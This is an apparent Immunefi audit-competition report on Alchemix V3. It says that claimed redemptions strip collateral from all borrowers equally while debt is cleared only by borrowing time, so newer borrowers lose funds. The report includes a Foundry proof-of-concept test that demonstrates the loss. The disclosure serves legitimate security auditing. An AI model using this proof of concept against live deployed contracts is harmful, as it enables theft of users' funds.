# 57852 sc critical old borrowers steal from new borrowers after redemptions are claimed

**Submitted on Oct 29th 2025 at 08:08:37 UTC by @arturtoros for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57852
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

After a redemption is claimed in `Transmuter.sol`, debt is cleared. It is cleared from the people that have had debt while the redemption was passing. The debt to clear is calculated proportionally from two thing -> the amount the user have been borrower ever since the redemption was created to the time it was claimed. Collateral is also decreased from the borrowers, but it is not calculated in the same way, it is equally decreased from everyone, no matter if someone has been borrower the whole time, or they have been borrower for 1 second. So it is unfair for newcomers, because their collateral is decreased, but their debt is not.

## Vulnerability Details

In the function `_sync()`, we have the following:

```solidity
// Collateral to remove from redemptions and fees
        uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight);
        account.collateralBalance -= collateralToRemove;
```

`_collateralWeight` can only increase in `redeem()` which is called during claiming of redemptions in the `Transmuter.sol`. So whenever there is a redemption, collateral weight goes up and the `collateralToRemove` does not actually rely on time the user has been borrower during the redemption's period, it is equally for all borrowers.

When a redemption happens, the protocol decides how much debt (account.debt) to clear from each borrower based on how long they’ve been borrowing during the redemption period.

It compares the current redemption weight (\_redemptionWeight) to the previous one (account.lastAccruedRedemptionWeight) to see how much of the redemption period has passed. Then it looks at the user’s exposure (userExposure), which is the part of their debt that hasn’t been earmarked yet.

Using these values, it calculates how much of that user’s debt should be cleared (redeemedTotal). In short, the longer a user has had active debt during the redemption, the more of it gets cleared.

So debt is reduced proportionally to time and exposure, not equally for everyone.

## Impact Details

Each time redemption happens, all of the users that have been borrowers for less than the full period of the redemption will lose part of their collateral unfairly, so that's loss of funds for the newcomed borrowers.

Also, their collateralization ratio decreases, and in some cases they could become liquidatable, as their position can become unhealthy.

## Proof of Concept

## Proof of Concept

Add this test to `AlchemistV3.t.sol`

```solidity
function testOldBorrowersStealFromNew() external {
        uint256 amount = 100e18;

        // both beef and dad deposit 100e18, but only beef mints 50e18 for now (with a collaterization ratio of 2)
        
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        vm.stopPrank();

        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xdad), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdDad = AlchemistNFTHelper.getFirstTokenId(address(0xdad), address(alchemistNFT));
        alchemist.mint(tokenIdDad, amount / 2, address(0xdad));
        vm.stopPrank();

        // Need to start a transmutator deposit, to start earmarking debt
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amount / 2);
        transmuterLogic.createRedemption(amount / 2);
        vm.stopPrank();

        // the transmutation time has passed but it is not yet claimed
        vm.roll(block.number + 5_256_000);

        // beef mints debt to themselves, again 50e18, so that their collaterization ratio is 2e18
        vm.startPrank(address(0xbeef));
        alchemist.mint(tokenIdBeef, amount / 2, address(0xbeef));
        vm.stopPrank();

        // redemption is claimed
        vm.startPrank(address(anotherExternalUser));
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();


        (uint256 collateralBeef, uint256 debtBeef, uint256 earmarkedBeef) = alchemist.getCDP(tokenIdBeef);
        console.log("collateral beef: ", collateralBeef);
        console.log("debt beef: ", debtBeef);
        console.log("earmarked beef: ", earmarkedBeef);


        (uint256 collateralDad, uint256 debtDad, uint256 earmarkedDad) = alchemist.getCDP(tokenIdDad);
        console.log("collateral dad: ", collateralDad);
        console.log("debt dad: ", debtDad);
        console.log("earmarked dad: ", earmarkedDad);

        // dad can actually withdraw 75e18, although his cleared debt is 50e18 (not 25e18)
        vm.startPrank(address(0xdad));
        alchemist.withdraw(75e18, address(0xdad), tokenIdDad);
        vm.stopPrank();

        // collaterization of Beef has dropped to 1,5e18, because from this redemption his debt was not cleared, but his collateral deposited has decreased
        uint256 collaterizationBeef = alchemist.totalValue(tokenIdBeef) * FIXED_POINT_SCALAR / debtBeef;
        console.log("collaterization of Beef: ", collaterizationBeef);

    }
```
